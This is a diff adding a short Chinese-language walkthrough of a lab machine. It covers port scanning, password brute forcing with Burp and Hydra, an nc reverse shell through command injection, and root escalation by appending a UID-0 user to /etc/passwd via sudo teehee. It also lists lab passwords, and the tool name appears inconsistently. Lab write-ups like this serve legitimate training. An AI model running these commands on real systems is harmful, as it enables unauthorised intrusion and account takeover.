@@ -1,0 +1,32 @@
+nmap -sV -A -p- 192.168.140.0/24
+探测主机，端口信息
+
+nmap -sV -A -p- 192.168.140.134
+获得主机信息
+
+dirb http://192.168.140.134
+扫描网页目录
+
+通过burp进行密码爆破
+获得登录密码happy1
+
+发现三个明令端口，没有对命令进行过滤，通过nc反弹shell
+nc -nv 192.168.140.129 9999 -e /bin/bash
+nc -lvnp 9999
+
+python -c "import pty; pty.spawn('/bin/bash')"
+
+获得权限后发现有jim用户，里边存在旧密码文件
+拷贝出来后利用Hydra爆破ssh
+hydra -l jim -P 1.txt -vV -f -t 8 192.168.140.134 ssh
+获得密码，ssh连接
+[22][ssh] host: 192.168.140.134   login: jim   password: jibril04
+
+连接后提示有一封邮件，mail文件夹下查看邮件获得charles的密码，开启另一个shell，ssh连接
+charles，sudo -l 后发现可以用geehee
+
+利用geehee提权
+echo "test:x:0:0:::/bin/bash"
+sudo teehee -a /etc/passwd
+
+切回jim目录，可以su到刚刚创建的用户，为root权限。
